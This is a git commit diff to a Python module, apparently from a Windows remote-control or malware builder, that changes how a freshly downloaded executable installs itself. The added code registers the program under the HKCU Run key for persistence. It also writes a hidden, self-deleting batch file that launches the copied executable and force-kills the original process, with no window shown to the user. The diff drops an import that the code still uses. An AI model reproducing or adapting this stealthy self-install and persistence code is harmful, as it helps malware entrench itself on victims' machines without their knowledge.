0a2dd52cec96dc61793774398ae7a5f539a9f9b4
Mateusz Gołembowski <44233157+mategol@users.noreply.github.com>
2023-06-08 02:41:35 +0200

    Changed the first run process
    So now, the just-downloaded executable copies into the system, executes the copied one and kills the old process.

--- resources/source_code/registry.py
+++ resources/source_code/registry.py
@@ -1,5 +1,4 @@
 from shutil import copy2, rmtree
-from getpass import getuser
 import winreg
 import sys
 import os
@@ -9,7 +8,7 @@ import os
 registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
 winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
 registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
-winreg.DeleteValue(registry_key, software_directory_name)
+winreg.DeleteValue(registry_key, software_registry_name)
 
 # !registry
 if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
@@ -22,3 +21,8 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
     registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
     winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
     winreg.CloseKey(registry_key)
+    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', 'w', encoding='utf-8') as activator:
+        process_name = sys.argv[0].split('\\')[-1]
+        activator.write(f'pushd "C:\\Users\\{getuser()}\\{software_directory_name}"\nstart "" "{software_executable_name}"\ntaskkill /f /im "{process_name}"\ndel "%~f0"')
+    subprocess.Popen(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW)
+    sys.exit(0)
